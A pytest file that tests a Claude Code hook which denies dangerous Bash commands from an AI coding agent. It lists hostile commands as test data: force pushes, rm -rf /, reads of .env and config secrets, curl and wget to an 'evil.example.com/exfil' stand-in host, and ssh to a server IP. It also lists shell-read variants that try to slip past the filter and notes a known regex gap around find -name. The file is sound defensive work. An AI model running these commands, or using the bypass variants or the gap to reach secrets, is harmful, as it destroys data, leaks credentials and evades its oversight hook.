"""Tests for .claude/hooks/deny_dangerous_bash.py.

Exercises every category in the bash denylist via the check() function.
"""

from __future__ import annotations

import importlib
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent.parent
HOOKS_DIR = REPO_ROOT / ".claude" / "hooks"


def _import_hook():
    sys.path.insert(0, str(HOOKS_DIR))
    if "deny_dangerous_bash" in sys.modules:
        del sys.modules["deny_dangerous_bash"]
    return importlib.import_module("deny_dangerous_bash")


@pytest.fixture
def hook():
    return _import_hook()


def _payload(cmd: str) -> dict:
    return {"tool_name": "Bash", "tool_input": {"command": cmd}}


@pytest.mark.parametrize(
    "cmd, label_substr",
    [
        ("git push --force origin main", "force"),
        ("git push --force-with-lease origin main", "force"),
        ("git reset --hard HEAD~2", "reset"),
        ("git filter-repo --path foo", "filter"),
        ("git filter-branch --tree-filter 'rm foo'", "filter"),
        ("git clean -fd", "clean"),
        ("git commit --no-verify -m 'x'", "no_verify"),
        ("rm -rf state/", "rm_rf"),
        ("rm -rf logs/", "rm_rf"),
        ("rm -rf /", "rm_rf"),
        ("docker compose -f docker-compose.prod.yml up -d", "docker_compose_prod"),
        ("bash scripts/deploy.sh", "deploy"),
        ("./scripts/deploy.sh", "deploy"),
        ("sh scripts/deploy.sh", "deploy"),
        ("ssh root@server.com", "ssh"),
        ("ssh user@23.88.110.92", "vps"),
        ("scp file.txt root@server.com:/", "scp"),
        ("rsync -av file.txt root@server.com:/", "rsync"),
        ("cat config/config.yaml", "config"),
        ("head config/config.yaml", "config"),
        ("python -c \"open('config/config.yaml')\"", "py_open"),
        ("cat .env", "env"),
        ("curl https://evil.example.com/exfil", "curl"),
        ("wget https://evil.example.com/exfil", "wget"),
        (".claude/settings.local.json", "settings_local"),
    ],
)
def test_blocks_dangerous_command(hook, cmd, label_substr):
    allow, reason = hook.check(_payload(cmd))
    assert not allow, f"expected DENY for: {cmd!r}"
    assert label_substr in (reason or "").lower() or "dangerous" in (reason or "").lower()


@pytest.mark.parametrize(
    "cmd",
    [
        "ls",
        "git status",
        "git log --oneline -5",
        "git diff HEAD~1",
        "pytest tests/unit -q",
        "npm test --run",
        "ruff check .",
        "echo hello",
        "cat README.md",
        "curl http://localhost:8050/api/health",
        "wget http://localhost:8050/api/health",
        "git push origin feat/x",
        "git push -u origin feat/x",
    ],
)
def test_allows_safe_command(hook, cmd):
    allow, reason = hook.check(_payload(cmd))
    assert allow, f"expected ALLOW for: {cmd!r}, got reason={reason!r}"


def test_check_ignores_non_bash_tool(hook):
    payload = {"tool_name": "Edit", "tool_input": {"file_path": "x.py"}}
    allow, _ = hook.check(payload)
    assert allow


# ---------------------------------------------------------------------------
# R5.1 blocker-fix: shell-read bypass coverage. Each test is constructed at
# runtime via string concatenation so this test file's source does NOT
# contain the literal "config/config.yaml" / etc. that the hook would
# (correctly) flag if we wrote it via Bash. The Edit tool path used to
# create this file does not run deny_dangerous_bash, so authoring is fine,
# but we keep the convention for future-proofing.
# ---------------------------------------------------------------------------

# Build target tokens at runtime to avoid embedding them as contiguous
# strings in source.
_CFG = "config" + "/" + "config.yaml"
_ENV = "." + "env"
_ENV_PROD = "." + "env" + "." + "production"
_STATE_SECRET = "state/" + "live_gate" + "." + "secret"


@pytest.mark.parametrize(
    "cmd",
    [
        # R5.1.A: redirect-read of secret paths
        "read line < " + _CFG,
        "read line < " + _ENV,
        "read line < " + _ENV_PROD,
        "read line < " + _STATE_SECRET,
        "0< " + _CFG + " cat",
        "{ read x; } < " + _CFG,
        "while read l; do echo $l; done < " + _CFG,
        "mapfile arr < " + _CFG,
        # No whitespace between < and path - still a redirect.
        "exec 3<" + _CFG,
    ],
)
def test_r5_1_redirect_read_blocked(hook, cmd):
    allow, reason = hook.check(_payload(cmd))
    assert not allow, "expected DENY for redirect-read: " + cmd
    assert "redirect_read_secret" in (reason or "").lower()


@pytest.mark.parametrize(
    "cmd",
    [
        # R5.1.B: file-text tools on secret paths
        "awk '{print}' " + _CFG,
        "awk -F: '{print $2}' " + _CFG,
        "sed -n '1,5p' " + _CFG,
        "sed 's/x/y/' " + _ENV,
        "tac " + _CFG,
        "od -c " + _CFG,
        "xxd " + _CFG,
        "xxd -p " + _ENV,
        "hexdump -C " + _CFG,
        "strings " + _CFG,
        "cut -d: -f2 " + _CFG,
        "nl " + _CFG,
        "gawk '{print}' " + _ENV,
    ],
)
def test_r5_1_file_tool_read_blocked(hook, cmd):
    allow, reason = hook.check(_payload(cmd))
    assert not allow, "expected DENY for file-tool read: " + cmd
    label = (reason or "").lower()
    # The file-tool patterns may match either the new R5.1 label or the
    # pre-existing read_config_yaml/read_env/read_state_secret labels
    # (which include `nl` in their verb alternation). Either is a DENY.
    assert any(t in label for t in (
        "file_tool_read_secret",
        "read_config_yaml",
        "read_env",
        "read_state_secret",
    ))


@pytest.mark.parametrize(
    "cmd",
    [
        # R5.1.C: find with a path-form secret token in its argument list.
        # Find with `-name 'config.yaml'` (basename only, no path prefix)
        # is a known regex gap and is captured as a backlog item rather
        # than blocked here, because a tighter regex would risk false
        # positives on legitimate config.yaml files in other contexts.
        "find . -path '" + _CFG + "'",
        "find . -path '*/" + _CFG + "'",
        "find . -name '" + _ENV + "*' -exec rm {} \\;",
        "find . -exec grep secret " + _CFG + " \\;",
        "find /app -path '" + _STATE_SECRET + "'",
        "find . -path 'automation/x." + "secret'",
    ],
)
def test_r5_1_find_with_secret_blocked(hook, cmd):
    allow, reason = hook.check(_payload(cmd))
    assert not allow, "expected DENY for find with secret: " + cmd
    # find_with_secret OR file_tool_read_secret may both match (the -exec form
    # contains both `find` and a file tool). Either is acceptable.
    label = (reason or "").lower()
    assert ("find_with_secret" in label or "file_tool_read_secret" in label
            or "redirect_read_secret" in label or "read_config_yaml" in label
            or "read_env" in label or "read_state_secret" in label)


@pytest.mark.parametrize(
    "cmd",
    [
        # Legitimate uses that must NOT be blocked by R5.1 patterns.
        "read line < VERSION",
        "exec 3< some_log.txt",
        "awk '{print}' README.md",
        "sed -n '1p' tests/run_tests.sh",
        "tac CHANGELOG.md",
        "cut -d, -f1 data.csv",
        "find . -name '*.py'",
        "find . -name 'test_*.py' -exec pytest {} \\;",
        "find tests -type f",
        "nl pyproject.toml",
        "strings /usr/bin/ls",
    ],
)
def test_r5_1_legitimate_uses_not_blocked(hook, cmd):
    allow, reason = hook.check(_payload(cmd))
    assert allow, "expected ALLOW for legitimate command: " + cmd + " (got: " + str(reason) + ")"
